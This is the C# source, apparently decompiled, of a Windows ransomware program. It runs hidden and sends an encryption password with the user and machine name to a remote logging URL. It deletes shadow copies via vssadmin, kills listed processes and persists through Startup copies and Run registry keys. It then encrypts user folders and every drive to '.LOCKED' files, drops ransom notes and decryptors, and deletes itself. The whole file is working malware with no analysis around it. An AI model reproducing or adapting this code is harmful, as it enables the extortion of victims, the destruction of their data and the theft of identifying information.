using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using System.Xml.Serialization;
using Microsoft.Win32;

namespace Main;

public class Form1 : Form
{
	private static byte[] passwordBytes;

	private static List<string> crypted = new List<string>();

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	private void startAction()
	{
		string text = createPassword(Settables.PASSLENGTH);
		Post(text);
		string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "DECRYPT_ME.TXT";
		File.WriteAllText(path, text);
		Proc();
		Shd();
		string location = Assembly.GetEntryAssembly()!.Location;
		byte[] buffer = File.ReadAllBytes(location);
		dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\servicesmc", buffer);
		addToStartupRegistry("Service", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\servicesmc.exe");
		if (!string.IsNullOrEmpty(Settables.CONTAINMENTPATH))
		{
			encryptDirectory(Settables.CONTAINMENTPATH);
		}
		else
		{
			string[] array = new string[11]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.Recent),
				Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.Personal),
				Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos),
				Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory)
			};
			string[] array2 = array;
			foreach (string location2 in array2)
			{
				encryptDirectory(location2);
			}
			string[] logicalDrives = Directory.GetLogicalDrives();
			string[] array3 = logicalDrives;
			foreach (string location3 in array3)
			{
				encryptDirectory(location3);
			}
			dropFiles();
			Wallpaper.Set(Settables.LOGURL + string.Empty, Wallpaper.Style.Stretched);
			text = null;
			passwordBytes = null;
		}
		killM3();
		Application.Exit();
	}

	public void Post(string msg)
	{
		try
		{
			using WebClient webClient = new WebClient();
			string address = Settables.LOGURL + "write.php";
			byte[] bytes = webClient.UploadValues(address, new NameValueCollection
			{
				{
					"user_name",
					Environment.UserName
				},
				{
					"computer_name",
					Environment.MachineName
				},
				{ "password", msg }
			});
			Encoding.UTF8.GetString(bytes);
		}
		catch (Exception ex)
		{
			if (ex.Data != null)
			{
			}
		}
	}

	private static string createPassword(int length)
	{
		string text = string.Empty;
		using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
		{
			while (text.Length != length)
			{
				byte[] array = new byte[1];
				rNGCryptoServiceProvider.GetBytes(array);
				char c = (char)array[0];
				if (Enumerable.Contains("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/$>][<)(}{", c))
				{
					text += c;
				}
			}
		}
		passwordBytes = Encoding.UTF8.GetBytes(text);
		passwordBytes = SHA512.Create().ComputeHash(passwordBytes);
		byte[] embeddedResource = getEmbeddedResource("Main.Embedded.pubkey.txt");
		string @string = Encoding.UTF8.GetString(embeddedResource);
		StringReader textReader = new StringReader(@string);
		XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
		RSAParameters parameters = (RSAParameters)xmlSerializer.Deserialize(textReader);
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.ImportParameters(parameters);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: false);
		return Convert.ToBase64String(inArray);
	}

	[DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);

	[DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool Wow64DisableWow64FsRedirection(out IntPtr OldValue);

	private void Shd()
	{
		try
		{
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.StartInfo.FileName = "cmd";
			bool Wow64Process = false;
			IsWow64Process(Process.GetCurrentProcess().Handle, out Wow64Process);
			if (Wow64Process)
			{
				IntPtr OldValue = IntPtr.Zero;
				Wow64DisableWow64FsRedirection(out OldValue);
			}
			process.StartInfo.WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			process.StartInfo.Arguments = "/C vssadmin Delete Shadows /All /Quiet";
			process.StartInfo.UseShellExecute = false;
			process.Start();
		}
		catch
		{
		}
	}

	public void killM3()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "/C timeout 2 && Del /Q /F " + Application.get_ExecutablePath();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
	}

	private bool Proc()
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] pROCLIST = Settables.PROCLIST;
			for (int i = 0; i < processes.Length; i++)
			{
				for (int j = 0; j < pROCLIST.Length; j++)
				{
					if (processes[i].ProcessName == pROCLIST[j])
					{
						processes[i].Kill();
					}
				}
			}
		}
		catch (Exception ex)
		{
			if (ex.Data != null)
			{
				return false;
			}
		}
		return true;
	}

	private void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (Settables.EXTENTIONS.Contains(extension.ToLower()))
				{
					encryptFile(files[i]);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch
		{
		}
	}

	private void encryptFile(string file)
	{
		try
		{
			try
			{
				if (Settables.Mode == ExecutionMode.Full)
				{
					byte[] bytes = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes);
					File.Move(file, file + ".LOCKED");
					crypted.Add(file);
					return;
				}
				if (new FileInfo(file).Length <= 4096L)
				{
					byte[] bytes2 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes2);
					File.Move(file, file + ".LOCKED");
					crypted.Add(file);
					return;
				}
				byte[] array = new byte[8192];
				using (BinaryReader binaryReader = new BinaryReader(File.Open(file, FileMode.Open)))
				{
					byte[] array2 = encryptAES(binaryReader.ReadBytes(4096), passwordBytes);
					Array.Copy(array2, array, array2.Length);
				}
				using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(file, FileMode.Open)))
				{
					binaryWriter.Write(array);
				}
				File.Move(file, file + ".LOCKED");
				crypted.Add(file);
			}
			catch (Exception)
			{
				FileAttributes attributes = File.GetAttributes(file);
				if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
				{
					attributes = RemoveAttribute(attributes, FileAttributes.ReadOnly);
					File.SetAttributes(file, attributes);
				}
				if (Settables.Mode == ExecutionMode.Full)
				{
					byte[] bytes3 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes3);
					File.Move(file, file + ".LOCKED");
					crypted.Add(file);
					return;
				}
				if (new FileInfo(file).Length <= 4096L)
				{
					byte[] bytes4 = encryptAES(File.ReadAllBytes(file), passwordBytes);
					File.WriteAllBytes(file, bytes4);
					File.Move(file, file + ".LOCKED");
					crypted.Add(file);
					return;
				}
				byte[] buffer = new byte[8192];
				using (BinaryReader binaryReader2 = new BinaryReader(File.Open(file, FileMode.Open)))
				{
					buffer = encryptAES(binaryReader2.ReadBytes(4096), passwordBytes);
				}
				using (BinaryWriter binaryWriter2 = new BinaryWriter(File.Open(file, FileMode.Open)))
				{
					binaryWriter2.Write(buffer);
				}
				File.Move(file, file + ".LOCKED");
				crypted.Add(file);
			}
		}
		catch
		{
		}
	}

	private byte[] encryptAES(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] array2 = null;
		List<byte[]> list = new List<byte[]>();
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			rijndaelManaged.GenerateIV();
			byte[] sALT = Settables.SALT;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, sALT, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			array = memoryStream.ToArray();
			list.Add(array);
			list.Add(rijndaelManaged.IV);
			list.Add(sALT);
		}
		return list.SelectMany((byte[] a) => a).ToArray();
	}

	private void dropFiles()
	{
		if (crypted.Count >= 1)
		{
			byte[] embeddedResource = getEmbeddedResource("Main.Embedded.Decrypt.exe");
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\Decryptor.exe", embeddedResource);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Decryptor.exe", embeddedResource);
			byte[] embeddedResource2 = getEmbeddedResource("Main.Embedded.Message.exe");
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\message.exe", embeddedResource2);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe", embeddedResource2);
			addToStartupRegistry("Message", Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe");
			startProcess(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\message.exe");
			byte[] bytes = Encoding.UTF8.GetBytes(Settables.RANSOM_NOTE);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\RANSOM_NOTE.txt", bytes);
			dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\RANSOM_NOTE.txt", bytes);
		}
	}

	private static void dropFile(string path, byte[] buffer)
	{
		try
		{
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, buffer);
			}
		}
		catch
		{
		}
	}

	private static byte[] getEmbeddedResource(string fullName)
	{
		byte[] array = null;
		Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(fullName);
		using MemoryStream memoryStream = new MemoryStream();
		manifestResourceStream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	private static void addToStartupRegistry(string name, string path)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(name, "\"" + path + "\"");
		}
		catch
		{
		}
	}

	private static void startProcess(string path)
	{
		try
		{
			Process.Start(path);
		}
		catch
		{
		}
	}

	private static FileAttributes RemoveAttribute(FileAttributes attributes, FileAttributes attributesToRemove)
	{
		return attributes & ~attributesToRemove;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(104, 0));
		((Form)this).set_ControlBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Form)this).add_Shown((EventHandler)Form1_Shown);
		((Control)this).ResumeLayout(false);
	}
}
